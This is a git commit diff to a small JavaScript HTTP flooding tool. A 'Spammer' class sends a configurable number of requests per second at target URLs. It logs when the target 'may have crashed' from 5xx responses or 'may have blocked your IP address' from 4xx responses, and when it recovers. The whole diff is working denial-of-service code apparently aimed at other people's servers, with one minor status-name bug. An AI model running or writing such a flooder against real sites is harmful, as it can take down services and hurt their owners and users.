88071ee3dc1f6f04d8eed20997003ed91216fc17
Mathias H Steffensen <ms@driversnote.com>
2022-03-12 22:35:08 +0100

    Small fixes

--- logger.js
+++ logger.js
@@ -8,18 +8,20 @@ export class Logger {
     timeEnd = console.timeEnd
 
     line(...strings) {
-        this.log(`${strings.join(" ")}\n`)
+        this.log(...strings)
     }
 
     serverCrash(requestsRun, statusCode, target) {
         this.line(`The server responded with a status ${statusCode} which indicates the target webserver at ${target} may have crashed.`)
         this.line(`So far ${requestsRun} requests have been sent`)
+        this.line()
         this.hasLoggedServerCrash = true
     }
 
     serverBlock(requestsRun, statusCode, target) {
         this.line(`The server responded with a status ${statusCode} which indicates the target webserver at ${target} may have blocked your IP address.`)
         this.line(`So far ${requestsRun} requests have been sent`)
+        this.line()
         this.hasLoggedServerBlock = true
     }
 }
--- spammer.js
+++ spammer.js
@@ -2,12 +2,14 @@ import fetch from "isomorphic-fetch";
 import { Logger } from "./logger.js";
 
 export class Spammer {
+    serverStatus = "up"
     intervalIds = []
     requestsSent = 0
     log = new Logger()
 
     async execute(urls, reqsPerSecond, secsToRun) {
         this.log.line(`Spamming ${urls} with ${reqsPerSecond*secsToRun} requests over ${secsToRun} seconds.`)
+        this.log.line()
 
         for (let url of urls) {
             this.log.time("spam")
@@ -17,21 +19,42 @@ export class Spammer {
 
     _spamUrl(url, reqsPerSecond, secsToRun) {
         return setInterval(async () => {
-            for (let i = 0; i < reqsPerSecond; i++) fetch(url).then(this._handleResponse)
-
-            this._incrementRequestCount(reqsPerSecond)
-
-            this._checkIfComplete(reqsPerSecond, secsToRun)
+            for (let i = 0; i < reqsPerSecond; i++) {
+                fetch(url).then((res) => {
+                    this._handleResponse(res, url)
+                    this._incrementRequestCount(1)
+                    this._checkIfComplete(reqsPerSecond, secsToRun)
+                })
+            }
         }, 1000)
     }
 
-    _handleResponse(res) {
+    _handleResponse(res, url) {
         if (res.status >= 500) {
             if (!this.log.hasLoggedServerCrash) this.log.serverCrash(this.requestsSent, res.status, url)
+            this.serverStatus = "crashed"
+            return
         }
 
         if (res.status >= 400) {
             if (!this.log.hasLoggedServerBlock) this.log.serverBlock(this.requestsSent, res.status, url)
+            this.serverStatus = "blocked"
+            return
+        }
+
+        if (this.serverStatus !== "up") {
+            if (this.serverStatus === "crashed") {
+                this.log.line("The server appears to be back up")
+            }
+
+            if (this.serverStatus === "block") {
+                this.log.line("The server appears to have unblocked you")
+            }
+
+            this.log.line()
+
+            this.serverStatus = "up"
+            this.log = new Logger()
         }
     }
 
